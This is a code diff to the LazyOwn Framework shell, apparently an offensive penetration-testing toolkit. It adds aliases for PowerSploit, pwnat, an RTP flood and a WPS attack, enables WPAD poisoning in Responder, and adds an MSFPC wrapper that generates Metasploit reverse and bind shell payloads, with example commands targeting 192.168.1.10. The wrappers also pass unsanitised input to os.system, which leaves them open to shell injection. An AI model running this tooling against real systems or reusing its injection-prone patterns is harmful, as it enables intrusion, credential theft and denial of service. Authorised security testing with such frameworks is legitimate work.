@@ -22,7 +22,6 @@ Description: This file contains the definition of the logic in the LazyOwnShell 
 from cmd import Cmd
 from utils import *
 
-
 class LazyOwnShell(Cmd):
     """
     A custom interactive shell for the LazyOwn Framework.
@@ -87,9 +86,13 @@ class LazyOwnShell(Cmd):
         "now": "clock",
         "p": "payload",
         "poison": "run lazylogpoisoning",
+        "powersploit":"sh powersploit -h",
+        "pwnat": "sh pwnat -s 8080",
         "q": "exit",
+        "rtpflood" : "sh sudo bash modules/lazyrtpflood.sh",
         "sniff": "run lazysniff",
         "venom": "run lazymsfvenom",
+        "wps":"sh sudo bash modules/lazywps.sh",
         "ww": "whatweb",
     }
 
@@ -2641,6 +2644,7 @@ class LazyOwnShell(Cmd):
         Runs the `nikto` tool to perform a web server vulnerability scan against the specified target host.
 
         1. Executes `nikto` with the `-h` option to specify the target host IP address.
+        2. Installs `nikto` if it is not already installed.
 
         :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
         :param rhost: The IP address of the target web server, specified in the `params` dictionary.
@@ -2659,9 +2663,71 @@ class LazyOwnShell(Cmd):
         if not check_rhost(rhost):
             return
 
-        print_msg(f"Try nikto -h {rhost} {RESET}")
-        os.system(f"nikto -h {rhost}")
+        if not is_binary_present("nikto"):
+            print_warn("Installing nikto...")
+            os.system("sudo apt install nikto -y")
+        
+        options = {
+            "ask": input("    [?] Enter whether to ask about submitting updates (yes, no, auto): "),
+            "check6": input("    [?] Check if IPv6 is working (yes/no): "),
+            "cgidirs": input("    [?] Enter CGI dirs to scan (none, all, or values like '/cgi/ /cgi-a/'): "),
+            "config": input("    [?] Enter the config file to use: "),
+            "display": input("    [?] Enter display options (1, 2, 3, 4, D, E, P, S, V): "),
+            "dbcheck": input("    [?] Check database and key files for syntax errors (yes/no): "),
+            "evasion": input("    [?] Enter encoding technique (1-8, A, B): "),
+            "followredirects": input("    [?] Follow 3xx redirects (yes/no): "),
+            "format": input("    [?] Enter output format (csv, json, htm, nbe, sql, txt, xml): "),
+            "host": rhost,
+            "id": input("    [?] Enter host authentication (id:pass or id:pass:realm): "),
+            "ipv4": input("    [?] Use IPv4 only (yes/no): "),
+            "ipv6": input("    [?] Use IPv6 only (yes/no): "),
+            "key": input("    [?] Enter client certificate key file: "),
+            "list_plugins": input("    [?] List all available plugins (yes/no): "),
+            "maxtime": input("    [?] Enter maximum testing time per host (e.g., 1h, 60m, 3600s): "),
+            "mutate": input("    [?] Enter mutation options (1-6): "),
+            "nointeractive": input("    [?] Disable interactive features (yes/no): "),
+            "nolookup": input("    [?] Disable DNS lookups (yes/no): "),
+            "nossl": input("    [?] Disable the use of SSL (yes/no): "),
+            "noslash": input("    [?] Strip trailing slash from URL (yes/no): "),
+            "no404": input("    [?] Disable nikto attempting to guess a 404 page (yes/no): "),
+            "option": input("    [?] Override an option in nikto.conf: "),
+            "output": input("    [?] Write output to this file ('.' for auto-name): "),
+            "pause": input("    [?] Pause between tests (seconds): "),
+            "plugins": input("    [?] Enter list of plugins to run (default: ALL): "),
+            "port": input("    [?] Enter port to use (default 80): "),
+            "rsacert": input("    [?] Enter client certificate file: "),
+            "root": input("    [?] Prepend root value to all requests (format: /directory): "),
+            "save": input("    [?] Save positive responses to this directory ('.' for auto-name): "),
+            "ssl": input("    [?] Force ssl mode on port (yes/no): "),
+            "tuning": input("    [?] Enter scan tuning (1-9, a-e, x): "),
+            "timeout": input("    [?] Enter timeout for requests (default 10 seconds): "),
+            "userdbs": input("    [?] Load only user databases, not the standard databases (all, tests): "),
+            "useragent": input("    [?] Override the default useragent: "),
+            "until": input("    [?] Run until the specified time or duration: "),
+            "url": self.params["url"],
+            "usecookies": input("    [?] Use cookies from responses in future requests (yes/no): "),
+            "useproxy": input("    [?] Use the proxy defined in nikto.conf, or argument http://server:port: "),
+            "version": input("    [?] Print plugin and database versions (yes/no): "),
+            "vhost": input("    [?] Enter virtual host (for Host header): "),
+            "404code": input("    [?] Ignore these HTTP codes as negative responses (always). Format: '302,301': "),
+            "404string": input("    [?] Ignore this string in response body content as negative response (always). Can be a regular expression: ")
+        }
+
+        nikto_command = f"nikto -h {options['host']}"
+
+        for key, value in options.items():
+            if value:
+                if key == "host":
+                    continue
+                elif key in ["ask", "check6", "dbcheck", "followredirects", "ipv4", "ipv6", "list_plugins", "nointeractive", "nolookup", "nossl", "noslash", "no404", "ssl", "usecookies", "useproxy", "version"]:
+                    nikto_command += f" --{key} {value}"
+                else:
+                    nikto_command += f" --{key} {value}"
+
+        print_msg(f"Running nikto with the following command: {nikto_command}")
+        os.system(nikto_command)
         return
+
 
     def do_finalrecon(self, line):
         """
@@ -4133,8 +4199,8 @@ class LazyOwnShell(Cmd):
         if not device:
             print_error("Device must be set use set device <network_device_ex_tun0>")
             return
-        print_msg(f"Try sudo responder -I {device}")
-        os.system(f"sudo responder -I {device}")
+        print_msg(f"Try sudo responder -I {device} -w On ")
+        os.system(f"sudo responder -I {device} -w On ")
         return
 
     def do_ip(self, line):
@@ -9860,6 +9926,87 @@ class LazyOwnShell(Cmd):
         print_msg(f"Try... davtest --url {url} {RESET}")
         os.system(f"davtest --url {url}")
         return
+
+    def do_msfpc(self, line):
+        """
+        Generates payloads using MSFvenom Payload Creator (MSFPC).
+
+        This function checks if `msfpc` is installed and installs it if necessary. It then runs `msfpc`
+        with the specified parameters to create a payload for penetration testing.
+
+        :param line: Not used in this implementation but reserved for future use.
+
+        :returns: None
+
+        Manual execution:
+        To manually generate a payload using MSFPC, use the following command:
+            msfpc <TYPE> <DOMAIN/IP> <PORT> <CMD/MSF> <BIND/REVERSE> <STAGED/STAGELESS> <TCP/HTTP/HTTPS/FIND_PORT> <BATCH/LOOP> <VERBOSE>
+
+        Replace the placeholders with the desired values. For example:
+            msfpc windows 192.168.1.10 4444 reverse stageless tcp verbose
+
+        Example usage:
+            msfpc windows 192.168.1.10        # Windows & manual IP.
+            msfpc elf bind eth0 4444          # Linux, eth0's IP & manual port.
+            msfpc stageless cmd py https      # Python, stageless command prompt.
+            msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
+            msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
+        """
+
+        if not is_binary_present("msfpc"):
+            print_warn("Installing msfpc...")
+            os.system("sudo apt install msfpc -y")
+
+        payload_types = [
+            "APK",
+            "ASP",
+            "ASPX",
+            "Bash [.sh]",
+            "Java [.jsp]",
+            "Linux [.elf]",
+            "OSX [.macho]",
+            "Perl [.pl]",
+            "PHP",
+            "Powershell [.ps1]",
+            "Python [.py]",
+            "Tomcat [.war]",
+            "Windows [.exe // .exe // .dll]"
+        ]
+
+        print_warn("Select the payload type:")
+        for i, payload_type in enumerate(payload_types, start=1):
+            print_msg(f"{i}. {payload_type}")
+
+        type_choice = int(input("Enter the number corresponding to the payload type: ")) - 1
+        if type_choice < 0 or type_choice >= len(payload_types):
+            print_error("Invalid choice. Please select a valid number.")
+            return
+
+        selected_type = payload_types[type_choice].split()[0].lower()
+
+        params = {
+            "type": selected_type,
+            "lhost": input("Enter the target IP or domain (default lhost): ") or self.params["lhost"],
+            "lport": input("Enter the port (default lport): ") or self.params["lport"],
+            "cmd_msf": input("Enter CMD or MSF (default msf): ") or "msf",
+            "bind_reverse": input("Enter BIND or REVERSE (default reverse): ") or "reverse",
+            "staged_stageless": input("Enter STAGED or STAGELESS (default stageless): ") or "stageless",
+            "protocol": input("Enter protocol (TCP, HTTP, HTTPS, FIND_PORT) (default tcp): ") or "tcp",
+            "batch_loop": input("Enter BATCH or LOOP (optional): "),
+            "verbose": input("Enter VERBOSE (optional): ")
+        }
+
+        msfpc_command = (
+            f"msfpc {params['type']} {params['lhost']} {params['lport']} {params['cmd_msf']} "
+            f"{params['bind_reverse']} {params['staged_stageless']} {params['protocol']} "
+            f"{params['batch_loop']} {params['verbose']}"
+        )
+
+        print_msg(f"Generating payload with MSFPC: {msfpc_command}")
+        os.system(msfpc_command)
+        
+        return
+
 
 if __name__ == "__main__":
     p = LazyOwnShell()
